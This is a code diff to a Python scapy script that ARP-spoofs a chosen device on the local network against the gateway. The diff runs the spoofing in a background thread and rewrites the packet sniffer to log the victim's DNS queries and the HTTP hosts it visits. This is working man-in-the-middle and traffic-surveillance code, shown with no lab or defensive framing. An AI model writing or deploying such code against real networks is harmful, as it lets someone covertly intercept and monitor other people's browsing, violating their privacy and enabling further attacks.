@@ -1,8 +1,8 @@
-from scapy.all import ARP, Ether, srp, send, sniff
+from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSQR, IP, TCP, Raw
 import os
 import time
 import netifaces
-import socket
+import threading
 
 # Function to get the network subnet
 def get_network_subnet():
@@ -76,15 +76,22 @@ def get_mac(ip):
     
     return answered_list[0][1].hwsrc if answered_list else None
 
-# Sniff network packets from the selected device
+# Sniff network packets and display activity (DNS and HTTP)
 def log_device_traffic(selected_device_ip):
     print(f"Logging traffic from {selected_device_ip}...")
 
     def packet_callback(packet):
-        if packet.haslayer(ARP):
-            print(f"ARP Packet from {packet[ARP].psrc}: {packet.summary()}")
-        else:
-            print(f"Packet from {selected_device_ip}: {packet.summary()}")
+        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
+            dns_query = packet[DNSQR].qname.decode('utf-8')
+            print(f"[DNS] {packet[IP].src} queried {dns_query}")
+        
+        elif packet.haslayer(TCP) and packet.haslayer(Raw):
+            payload = packet[Raw].load.decode(errors="ignore")
+            if "Host:" in payload:
+                host_line = [line for line in payload.splitlines() if "Host:" in line]
+                if host_line:
+                    host = host_line[0].split(" ")[1]
+                    print(f"[HTTP] {packet[IP].src} visited {host}")
 
     sniff(filter=f"ip src {selected_device_ip}", prn=packet_callback, store=False)
 
@@ -139,10 +146,8 @@ def main():
     arp_device_mac = get_mac(arp_device_ip)
 
     # Start ARP spoofing in the background
-    try:
-        arp_spoof(target_ip, target_mac, gateway_ip, arp_device_mac)
-    except Exception as e:
-        print(f"Error: {e}")
+    spoofing_thread = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, gateway_ip, arp_device_mac))
+    spoofing_thread.start()
 
     # Log all network requests from the selected device
     log_device_traffic(target_ip)
